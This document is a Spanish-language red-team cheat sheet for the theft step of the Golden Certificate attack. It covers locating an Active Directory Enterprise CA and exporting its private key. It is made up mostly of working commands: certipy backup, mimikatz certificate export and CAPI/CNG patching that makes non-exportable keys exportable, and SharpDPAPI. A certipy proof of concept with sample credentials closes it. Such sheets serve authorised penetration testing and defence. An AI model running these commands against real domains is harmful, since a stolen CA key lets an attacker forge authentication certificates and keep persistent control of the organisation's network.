---
aliases:
  - Golden Certificate CA Key Theft
  - CA Private Key Extraction
tags:
  - technique/persistence
  - technique/credential-access
  - asset/active-directory
  - env/windows
  - service/ad-cs
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Golden Certificate]]"
---
# Golden Certificate - CA Key Theft

> Variables: `CA=corp-CA`, `CAHOST=ca.corp.local`, `U=user`, `P=pass`. Requiere **admin local en el servidor de la Enterprise CA**.

---

## Localizar la CA

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy find -u $U@corp.local -p $P -dc-ip $IP -stdout` | CAs del dominio, hostname, templates | Recon AD CS inicial. |
| `certutil -config - -ping` | CA configurada en el dominio | Desde host Windows dominado. |
| `Get-CertificationAuthority` (PSPKI) | Enterprise CAs y su host | Identificar el `CAHOST`. |
^gc-theft-locate

## Exportar la Private Key (con admin en el CA host)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy ca -backup -ca $CA -u $U@corp.local -p $P -target $CAHOST` | Cert + **private key** de la CA → `$CA.pfx` | Forma más limpia (remota). |
| `mimikatz # crypto::certificates /systemstore:local_machine /store:my /export` | Exporta certs+keys del store de la CA | Desde el CAHOST. |
| `mimikatz # crypto::capi` y `crypto::cng /export` | Parchea CAPI/CNG para hacer exportable una key marcada como no-exportable | Si el export directo falla. |
| `SharpDPAPI.exe certificates /machine` | Certs de máquina (incl. CA key) vía DPAPI | Post-explotación alternativa. |
^gc-theft-export

### PoC certipy backup

```bash
# Remoto, con admin sobre el CA host
certipy ca -backup -ca 'corp-CA' -u admin@corp.local -p 'Pass123!' -target ca.corp.local
# → guarda corp-CA.pfx (cert + private key de la CA)
```

---

> Con `$CA.pfx` en mano → forjar certs offline: [[Golden Certificate - Forge y Auth]].
